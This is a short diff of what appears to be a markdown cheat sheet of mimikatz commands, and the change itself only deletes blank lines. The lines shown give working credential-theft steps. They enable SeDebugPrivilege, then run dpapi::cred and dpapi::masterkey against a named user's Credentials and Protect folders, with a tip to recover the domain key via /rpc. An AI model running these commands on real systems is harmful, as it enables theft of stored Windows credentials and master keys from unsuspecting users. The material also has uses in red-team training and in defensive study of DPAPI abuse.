@@ -11,7 +11,6 @@ mimikatz.exe
 ```
 
 Engage SeDebugPrivilege
-
 ```
 privilege::debug
 ```
@@ -72,5 +71,4 @@ dpapi::cred /in:"C:\Users\Bethany\AppData\Local\Microsoft\Credentials\DFBE70A7E5
 ```
 dpapi::masterkey /in:"C:\Users\Bethany\AppData\Roaming\Microsoft\Protect\S-1-5-21-471342483-1622715373-4132421626-1002\fbd1319f-d18d-448f-92e2-287944ecf24c"
 ```
-
 -> Look for "[domainkey]", decrypt using same command with `/rpc`
